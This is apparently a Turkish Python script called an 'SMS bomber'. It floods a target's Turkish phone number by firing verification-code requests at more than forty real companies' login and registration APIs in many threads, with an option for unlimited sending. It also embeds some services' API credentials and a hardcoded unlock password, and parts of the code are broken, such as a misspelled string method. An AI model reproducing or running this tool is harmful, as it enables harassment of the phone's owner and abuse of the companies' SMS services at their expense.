import random 
import time
import webbrowser
import subprocess, sys, os
import colorama 
from colorama import Fore
try:
    import requests, urllib3, uuid
except ImportError:
    print("Gerekli modüller indiriliyor...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests==2.28.2", "urllib3==1.26.13", "uuid==1.30"])
finally:
    import concurrent.futures, json, os, random, requests, string, time, urllib, urllib3, uuid
 
K = '\033[1;31m'
Y = '\033[2;32m'
R = '\033[2;36m'
C = '\033[2;35m'

webbrowser.open("https://youtube.com/shorts/1VTl4cpyFFI?si=Oidemc90b559-BH5")	

print(K+"""       *datalara olaşmak icin şifreyi girin*             |
—————————————————————————————————————————————————————————|""")
	
def Tasimacim(number):
    try:
        url = "https://server.tasimacim.com/requestcode"
        payload = {
            "phone" : f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Tasimacim"
        else:
            return False, "Tasimacim"
    except:
        return False, "Tasimacim"

def a101(number):
    try:
        url = "https://www.a101.com.tr/users/otp-login/"
        payload = {
            "phone" : f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "A101"
        else:
            return False, "A101"
    except:
        return False, "A101"

def bim(number):
    try:
        url = "https://bim.veesk.net/service/v1.0/account/login"
        payload = {
            "phone" : f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "BIM"
        else:
            return False, "BIM"
    except:
        return False, "BIM"

def defacto(number):
    try:
        url = "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms"
        payload = {
            "mobilePhone" : f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["Data"]
        if r1 == "IsSMSSend":
            return True, "Defacto"
        else:
            return False, "Defacto"
    except:
        return False, "Defacto"

def istegelsin(number):
    try:
        url = "https://prod.fasapi.net:443/"
        payload = {
            "query" : "\n        mutation SendOtp2($phoneNumber: String!) {\n          sendOtp2(phoneNumber: $phoneNumber) {\n            alreadySent\n            remainingTime\n          }\n        }",
            "variables" : {
                "phoneNumber" : f"90{number}"
            }
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "İsteGelsin"
        else:
            return False, "İsteGelsin"
    except:
        return False, "İsteGelsin"

def ikinciyeni(number):
    try:
        url = "https://apigw.ikinciyeni.com/RegisterRequest"
        payload = {
            "accountType": 1,
            "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}@gmail.com",
            "isAddPermission": False,
            "name": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
            "lastName": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
            "phone": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSucceed"]

        if r1 == True:
            return True, "İkinci Yeni"
        else:
            return False, "İkinci Yeni"
    except:
        return False, "İkinci Yeni"

def migros(number):
    try:
        url = "https://rest.migros.com.tr:443/sanalmarket/users/register/otp"
        payload = {
            "phoneNumber": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["successful"]

        if r1 == True:
            return True, "Migros"
        else:
            return False, "Migros"
    except:
        return False, "Migros"

def ceptesok(number):
    try:
        url = "https://api.ceptesok.com/api/users/sendsms"
        payload = {
            "mobile_number": f"{number}",
            "token_type": "register_token"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 200:
            return True, "Cepte Şok"
        else:
            return False, "Cepte Şok"
    except:
        return False, "Cepte Şok"

def tiklagelsin(number):
    try:
        url = "https://www.tiklagelsin.com/user/graphql"
        payload = {
            "operationName": "GENERATE_OTP",
            "variables": {
                "phone": f"+90{number}",
                "challenge": f"{uuid.uuid4()}",
                "deviceUniqueId": f"web_{uuid.uuid4()}"
            },
            "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(\n    phone: $phone\n    challenge: $challenge\n    deviceUniqueId: $deviceUniqueId\n  )\n}\n"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Tıkla Gelsin"
        else:
            return False, "Tıkla Gelsin"
    except:
        return False, "Tıkla Gelsin"

def bisu(number):
    try:
        url = "https://www.bisu.com.tr:443/api/v2/app/authentication/phone/register"
        payload = {
            "phoneNumber": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "BiSU"
        else:
            return False, "BiSU"
    except:
        return False, "BiSU"

def filemarket(number):
    try:
        url = "https://api.filemarket.com.tr:443/v1/otp/send"
        payload = {
            "mobilePhoneNumber": f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["data"]
        if r1 == "200 OK":
            return True, "File"
        else:
            return False, "File"
    except:
        return False, "File"

def ipragraz(number):
    try:
        url = "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
        payload = {
            "otp": "",
            "phoneNumber": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "İpragaz"
        else:
            return False, "İpragaz"
    except:
        return False, "İpragaz"

def pisir(number):
    try:
        url = "https://api.pisir.com/v1/login/"
        payload = {"msisdn": f"90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["ok"]
        if r1 == "1":
            return True, "Pişir"
        else:
            return False, "Pişir"
    except:
        return False, "Pişir"

def coffy(number):
    try:
        url = "https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode"
        payload = {"phoneNumber": f"+90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "Coffy"
        else:
            return False, "Coffy"
    except:
        return False, "Coffy"

def sushico(number):
    try:
        url = "https://api.sushico.com.tr/tr/sendActivation"
        payload = {"phone": f"+90{number}", "location": 1, "locale": "tr"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["err"]
        if r1 == 0:
            return True, "SushiCo"
        else:
            return False, "SushiCo"
    except:
        return False, "SushiCo"

def kalmasin(number):
    try:
        url = "https://api.kalmasin.com.tr/user/login"
        payload = {
            "dil": "tr",
            "device_id": "",
            "notification_mobile": "android-notificationid-will-be-added",
            "platform": "android",
            "version": "2.0.6",
            "login_type": 1,
            "telefon": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "Kalmasın"
        else:
            return False, "Kalmasın"
    except:
        return False, "Kalmasın"

def yotto(number):
    try:
        url = "https://42577.smartomato.ru/account/session.json"
        payload = {
            "phone" : f"+90 ({str(number)[0:3]}) {str(number)[3:6]}-{str(number)[6:10]}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 201:
            return True, "Yotto"
        else:
            return False, "Yotto"
    except:
        return False, "Yotto"

def qumpara(number):
    try:
        url = "https://tr-api.fisicek.com/v1.4/auth/getOTP"
        payload = {
            "msisdn" : f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Qumpara"
        else:
            return False, "Qumpara"
    except:
        return False, "Qumpara"

def aygaz(number):
    try:
        url = "https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode"
        payload = {
            "Gsm" : f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Aygaz"
        else:
            return False, "Aygaz"
    except:
        return False, "Aygaz"

def pawapp(number):
    try:
        url = "https://api.pawder.app/api/authentication/sign-up"
        payload = {
            "languageId" : "2",
            "mobileInformation" : "",
            "data" : {
                "firstName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                "lastName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                "userAgreement" : "true",
                "kvkk" : "true",
                "email" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com",
                "phoneNo" : f"{number}",
                "username" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=10))}"
            }
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "PawAPP"
        else:
            return False, "PawAPP"
    except:
        return False, "PawAPP"

def mopas(number):
    try:
        url = "https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials"
        r = requests.post(url=url, timeout=2)
        
        if r.status_code == 200:
            token = json.loads(r.text)["access_token"]
            token_type = json.loads(r.text)["token_type"]
            url = f"https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber={number}"
            headers = {"authorization": f"{token_type} {token}"}
            r1 = requests.get(url=url, headers=headers, timeout=2)
            
            if r1.status_code == 200:
                return True, "Mopaş"
            else:
                return False, "Mopaş"
        else:
            return False, "Mopaş"
    except:
        return False, "Mopaş"

def paybol(number):
    try:
        url = "https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms"
        payload = {
            "otp_code" : "null",
            "phone_number" : f"90{number}",
            "reference_id" : "null"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        
        if r.status_code == 200:
            return True, "Paybol"
        else:
            return False, "Paybol"
    except:
        return False, "Paybol"

sifre = 'wwHECKv18441'
pss = input("""\x1b[1;32m       şifreyi giriniz                                   |  \n—————————————————————————————————————————————————————————|       
 *𝐒𝐢𝐟𝐫𝐞*						 |
    └─>""")
if pss == sifre:
    print('\x1b[1;32m                    DOĞRU ŞİFRE✅')
    time.sleep(2)
    os.system('clear')
else:
    exit('\x1b[1;31m                    HATALI ŞİFRE❌ ')
def generate_guid():
    return str(uuid.uuid4())
time. sleep (4) 

def ninewest(number):
    try:
        url = "https://www.ninewest.com.tr/webservice/v1/register.json"
        payload = {
            "alertMeWithEMail" : False,
            "alertMeWithSms" : False,
            "dataPermission" : True,
            "email" : "asdafwqww44wt4t4@gmail.com",
            "genderId" : random.randint(0,3),
            "hash" : "5488b0f6de",
            "inviteCode" : "",
            "password" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=16))}",
            "phoneNumber" : f"({str(number)[0:3]}) {str(number)[3:6]} {str(number)[6:8]} {str(number)[8:10]}",
            "registerContract" : True,
            "registerMethod" : "mail",
            "version" : "3"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        
        if r1 == True:
            return True, "Nine West"
        else:
            return False, "Nine West"
    except:
        return False, "Nine West"

def saka(number):
    try:
        url = "https://mobilcrm2.saka.com.tr/api/customer/login"
        payload = {
            "gsm" : f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["status"]
        if r1 == 1:
            return True, "Saka"
        else:
            return False, "Saka"
    except:
        return False, "Saka"

def superpedestrian(number):
    try:
        url = "https://consumer-auth.linkyour.city/consumer_auth/register"
        payload = {
            "phone_number" : f"+90{str(number)[0:3]} {str(number)[3:6]} {str(number)[6:10]}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["detail"]
        if r1 == "Ok":
            return True, "Superpedestrian"
        else:
            return False, "Superpedestrian"
    except:
        return False, "Superpedestrian"

def hayat(number):
    try:
        url = f"https://api.hayatsu.com.tr:443/api/SignUp/SendOtp{number}"
        r = requests.post(url=url, timeout=5)
        r1 = json.loads(r.text)["IsSuccessful"]
        if r1 == True:
            return True, "Hayat"
        else:
            return False, "Hayat"
    except:
        return False, "Hayat"

def tazi(number):
    try:
        url = "https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
        payload = {
            "cep_tel" : f"{number}",
            "cep_tel_ulkekod" : "90"
        }
        headers = {
            "authorization" : "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Tazı"
        else:
            return False, "Tazı"
    except:
        return False, "Tazı"

def gofody(number):
    try:
        url = "https://backend.gofody.com/api/v1/enduser/register/"
        payload = {
            "country_code": "90",
            "phone": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "GoFody"
        else:
            return False, "GoFody"
    except:
        return False, "GoFody"

def weescooter(number):
    try:
        url = "https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin"
        payload = {
            "tenant": "62a1e7efe74a84ea61f0d588",
            "gsm": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Wee Scooter"
        else:
            return False, "Wee Scooter"
    except:
        return False, "Wee Scooter"

def scooby(number):
    try:
        url = f"https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90{number}"
        r = requests.get(url=url, timeout=5)
        if r.status_code == 200:
            return True, "Scooby"
        else:
            return False, "Scooby"
    except:
        return False, "Scooby"

def gez(number):
    try:
        url = f"https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90{number}"
        r = requests.get(url=url, timeout=5)
        r1 = json.loads(r.text)["succeeded"]
        if r1 == True:
            return True, "Gez"
        else:
            return False, "Gez"
    except:
        return False, "Gez"

def heyscooter(number):
    try:
        url = f"https://heyapi.heymobility.tech/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={number}"
        headers = {"user-agent" : "okhttp/3.12.1"}
        r = requests.post(url=url, headers=headers, timeout=5)
        r1 = json.loads(r.text)["IsSuccess"]
        if r1 == True:
            return True, "Hey Scooter"
        else:
            return False, "Hey Scooter"
    except:
        return False, "Hey Scooter"

def jetle(number):
    try:
        url = f"http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber={number}&firmaID=1048"
        r = requests.get(url=url, timeout=5)
        if r.status_code == 200:
            return True, "Jetle"
        else:
            return False, "Jetle"
    except:
        return False, "Jetle"

def rabbit(number):
    try:
        url = "https://api.rbbt.com.tr/v1/auth/authenticate"
        payload = {
            "mobile_number" : f"+90{number}",
            "os_name" : "android",
            "os_version" : "7.1.2",
            "app_version" : " 1.0.2(12)",
            "push_id" : "-"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["status"]
        if r1 == True:
            return True, "Rabbit"
        else:
            return False, "Rabbit"
    except:
        return False, "Rabbit"

def roombadi(number):
    try:
        url = "https://api.roombadi.com/api/v1/auth/otp/authenticate"
        payload = {"phone": f"{number}", "countryId": 2}
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Roombadi"
        else:
            return False, "Roombadi"
    except:
        return False, "Roombadi"

def hizliecza(number):
    try:
        url = "https://hizlieczaprodapi.hizliecza.net:443/mobil/account/sendOTP"
        payload = {"phoneNumber": f"+90{number}", "otpOperationType": 2}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSuccess"]
        if r1 == True:
            return True, "Hızlı Ecza"
        else:
            return False, "Hızlı Ecza"
    except:
        return False, "Hızlı Ecza"

def signalall(number):
    try:
        url = "https://appservices.huzk.com/client/register"
        payload = {
            "name": "",
            "phone": {
                "number": f"{number}",
                "code": "90",
                "country_code": "TR",
                "name": ""
            },
            "countryCallingCode": "+90",
            "countryCode": "TR",
            "approved": True,
            "notifyType": 99,
            "favorites": [],
            "appKey": "live-exchange"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "SignalAll"
        else:
            return False, "SignalAll"
    except:
        return False, "SignalAll"

def goyakit(number):
    try:
        url = f"https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone={number}&isRegistered=false"
        r = requests.get(url=url, timeout=5)
        r1 = json.loads(r.text)["data"]["success"]
        if r1 == True:
            return True, "Go Yakıt"
        else:
            return False, "Go Yakıt"
    except:
        return False, "Go Yakıt"

def pinar(number):
    try:
        url = "https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp"
        payload = {
            "MobilePhone" : f"{number}"
        }
        headers = {
            "devicetype" : "android",
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.text == True:
            return True, "Pınar"
        else:
            return False, "Pınar"
    except:
        return False, "Pınar"

def oliz(number):
    try:
        url = "https://api.oliz.com.tr/api/otp/send"
        payload = {
            "mobile_number" : f"{number}",
            "type" : None
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["meta"]["messages"]["success"][0]
        if r1 == "SUCCESS_SEND_SMS":
            return True, "Oliz"
        else:
            return False, "Oliz"
    except:
        return False, "Oliz"

def macrocenter(number):
    try:
        url = f"https://www.macrocenter.com.tr/rest/users/login/otp?reid={int(time.time())}"
        payload = {
            "phoneNumber" : f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["successful"]
        if r1 == True:
            return True, "Macro Center"
        else:
            return False, "Macro Center"
    except:
        return False, "Macro Center"

def marti(number):
    try:
        url = "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin"
        payload = {
            "mobilePhone" : f"{number}",
            "mobilePhoneCountryCode" : "90"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSuccess"]
        if r1 == True:
            return True, "Martı"
        else:
            return False, "Martı"
    except:
        return False, "Martı"

def karma(number):
    try:
        url = "https://api.gokarma.app/v1/auth/send-sms"
        payload = {
            "phoneNumber" : f"90{number}",
            "type" : "REGISTER",
            "deviceId" : f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}",
            "language" : "tr-TR"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 201:
            return True, "Karma"
        else:
            return False, "Karma"
    except:
        return False, "Karma"

def joker(number):
    try:
        url = "https://api.joker.com.tr:443/api/register"
        payload = {
            "phone" : f"{number}"
        }
        headers = {
            "user-agent" : ""
        }
        r = requests.post(url=url, headers=headers, data=payload, timeout=5)
        r1 = json.loads(r.text)["success"]

        if r1 == True:
            return True, "Joker"
        else:
            return False, "Joker"
    except:
        return False, "Joker"

def hop(number):
    try:
        url = "https://api.hoplagit.com:443/v1/auth:reqSMS"
        payload = {
            "phone" : f"+90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 201:
            return True, "Hop"
        else:
            return False, "Hop"
    except:
        return False, "Hop"

def kimgbister(number):
    try:
        url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp"
        payload = {
            "msisdn" : f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 200:
            return True, "Kim GB Ister"
        else:
            return False, "Kim GB Ister"
    except:
        return False, "Kim GB Ister"

def anadolu(number):
    try:
        url = "https://www.anadolu.com.tr/Iletisim_Formu_sms.php"
        payload = urllib.parse.urlencode({
            "Numara": f"{str(number)[0:3]}{str(number)[3:6]}{str(number)[6:8]}{str(number)[8:10]}"
        })
        headers = {
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        }
        r = requests.post(url=url, headers=headers, data=payload, timeout=5)
        if r.status_code == 200:
            return True, "Anadolu"
        else:
            return False, "Anadolu"
    except:
        return False, "Anadolu"

def total(number):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    try:
        url = f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={number}"
        r = requests.post(url=url, verify=False, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "Total"
        else:
            return False, "Total"
    except:
        return False, "Total"

def englishhome(number):
    try:
        url = "https://www.englishhome.com:443/api/member/sendOtp"
        payload = {
            "first_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "last_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}@gmail.com",
            "phone": f"0{number}",
            "password": f"{''.join(random.choices(string.ascii_lowercase + string.digits + string.ascii_uppercase, k=8))}",
            "email_allowed": False,
            "sms_allowed": False,
            "confirm": True,
            "tom_pay_allowed": True
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 202:
            return True, "English Home"
        else:
            return False, "English Home"
    except:
        return False, "English Home"

def petrolofisi(number):
    try:
        url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
        payload = {
            "approvedContractVersion": "v1",
            "approvedKvkkVersion": "v1",
            "contractPermission": True,
            "deviceId": "",
            "etkContactPermission": True,
            "kvkkPermission": True,
            "mobilePhone": f"0{number}",
            "name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "plate": f"{str(random.randrange(1, 81)).zfill(2)}{''.join(random.choices(string.ascii_uppercase, k=3))}{str(random.randrange(1, 999)).zfill(3)}",
            "positiveCard": "",
            "referenceCode": "",
            "surname": f"{''.join(random.choices(string.ascii_lowercase, k=8))}"
        }
        headers = {
            "X-Channel": "IOS"
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.status_code == 204:
            return True, "Petrol Ofisi"
        else:
            return False, "Petrol Ofisi"
    except:
        return False, "Petrol Ofisi"

def send_service(number, service):
    global all_sends
    global success_sends
    global failed_sends
    result = service(number=number)
    if result[0] == True:
        all_sends += 1
        success_sends += 1
        print(f"[+] {all_sends} {result[1]}")
    else:
        all_sends += 1
        failed_sends += 1
        print(f"[-] {all_sends} {result[1]}")

for i in range(40000) :	
	print(Y+"""167 167 110 105 103 113 40 124 374 162 153 164 374 162 40 166 145 40 142 151 162 40 143 157 153 40 537 145 171 151 40 171 141 160 155 141 171 141 144 141 40 150 141 172 461 162 144 461 162 12 142 157 154 141 537 461 162 163 141 156 461 172 40 163 157 156 157 143 154 141 162 461 156 141 40 153 141 164 154 141 156 461 162 163 461 156 461 172 12 167 167 110 105 103 113 40 167 167 110 105 103 113 40 167 167 110 105 103 113 12 167 167 110 105 103 113 40 167 167 110 105 103 113 12 167 167 110 105 103 113 12 127 105 117 130 40 131 124 40 123 117 116 101 122 12 104 105 126 101 115 111 40 107 105 114 105 103 105 113 40 124 101 113 460 120 124 105 40 113 101 114 111 116 """)

print(R+"""                        ____  __  __ ____
   __      ____      __/ ___||  \/  / ___|                            \ \ /\ / /\ \ /\ / /\___ \| |\/| \___ \                             \ V  V /  \ V  V /  ___) | |  | |___) |                             \_/\_/    \_/\_/  |____/|_|  |_|____/
""")

print(R+"""           ____   ___  __  __ ____  _____ ____                               | __ ) / _ \|  \/  | __ )| ____|  _ \                              |  _ \| | | | |\/| |  _ \|  _| | |_) |                             | |_) | |_| | |  | | |_) | |___|  _ <
          |____/ \___/|_|  |_|____/|_____|_| \_\ """)

print(R+"—"*49+"""|
                                                 |""")  
print("""                                                 |
   YT: @WEOXYT    	TG: @Weoxst              |
                                                 |
   DC: https://discord.com/invite/SnQtzdDsr2     |
                                                 | """)
print(R+"—"*49+"""|
				           	 |""")

print(C+"—"*49+"""|
                                                 |""")


def send(number, amount, worker_amount):
    global clear
    global all_sends
    global success_sends
    global failed_sends
    start_time = int(time.perf_counter())
    functions = [tiklagelsin, englishhome, kimgbister, paybol, a101, anadolu, aygaz, bisu, ceptesok, coffy, defacto, gez, gofody, goyakit, hayat, heyscooter, hizliecza, hop, ikinciyeni, ipragraz, istegelsin, jetle, joker, kalmasin, karma, macrocenter, superpedestrian, sushico, tazi, total, weescooter, yotto]
    random.shuffle(functions)
    clear()
    print(f"{number} numarasına SMS gönderimi başlatıldı!\n")
    if amount == 0:
        with concurrent.futures.ThreadPoolExecutor(max_workers=worker_amount) as executor:
            i = 0
            while True:
                executor.submit(send_service, number, functions[i % 32])
                i += 1
                if i == len(functions):
                    i = 0
    else:
        with concurrent.futures.ThreadPoolExecutor(max_workers=worker_amount) as executor:
            for i in range(amount):
                executor.submit(send_service, number, functions[i % 32])
    print(K+"—"+K+"|")
    print("\nGönderim tamamlandı!")
    print(f"{all_sends} SMS, {int(time.perf_counter()) - start_time} saniye içerisinde gönderildi. {success_sends} başarılı, {failed_sends} başarısız.\n")
    all_sends = 0
    success_sends = 0
    failed_sends = 0
    restart()

def watermark():
    print("   wwSMS BOMBER V1 WEOX FARKIYLA:)               |")

def get_number():
    global clear
    while True:
        try:
            number = int(input(f"""   Telefon numarasını yazın                     |
   (Sadece Türkiye numaralarında çalışır! )      | \n—————————————————————————————————————————————————|
  wwSMS                                          |
  └─>"""))  
            if len(str(number)) == 10 and str(number)[0] == "5":
                return number  
            else:
                clear()
                print(f"""Numara Yanlış. Lütfen geçerli bir numara girin.  |""")
        except:
            clear()
            print(f"""Lütfen bir numara yazın.                         |""")
def get_amount():
    global clear
    while True:
        try:
            print(C+"—"*49+"""|
                                                 |""")
            amount = int(input(f"""   Kaç SMS  gönderilsin? Sınırsız gönderim       |
   için "0" basın.                               |\n ————————————————————————————————————————————————|                 
  wwSMS                                          |               
  └─> """))
            if amount >= 0:
                return amount
            else:
                clear()
                print(f"Girilen sayı 0'dan küçük olamaz.yarram niye 0'den küçük sayı giriyon")
        except:
            clear()
            print(f"""Lütfen bir sayı girin.                           |""")

def get_worker_amount():
    global clear
    while True:
        try:
            worker_amount = int(input(f"""   Thread sayısını girin.                        |
   Tavsiye edilen 3-100 arasıdır.                |\n—————————————————————————————————————————————————|
  wwSMS                                          |
 └─> """))
            if worker_amount >= 1:
                print(Y+"—"*49+Y+"|")
                return worker_amount
            else:
                clear()
                print(f"""   Girilen sayı 1'den küçük olamaz.              |
   yarram niye 1'den küçük sayı giriyon          |""")
        except:
            clear()
            print(f"""Lütfen bir sayı girin.                           |""")
            
def restart():
    global clear
    while True:
        question = input(f"   Programdan çıkılsın mı?\n[Y/N] : ").upper().xeplace(" ", "")
        if question == "Y":
            quit()
        elif question == "N":
            clear()
            start()
            break
        else:
            clear()
            print(f"Yanlış tuşa basıldı!")

def start():
    global clear
    clear()
    watermark()
    number = get_number()
    amount = get_amount()
    worker_amount = get_worker_amount()
    send(number=number, amount=amount, worker_amount=worker_amount)

all_sends = 0
success_sends = 0
failed_sends = 0
clear = lambda: os.system("cls")


start()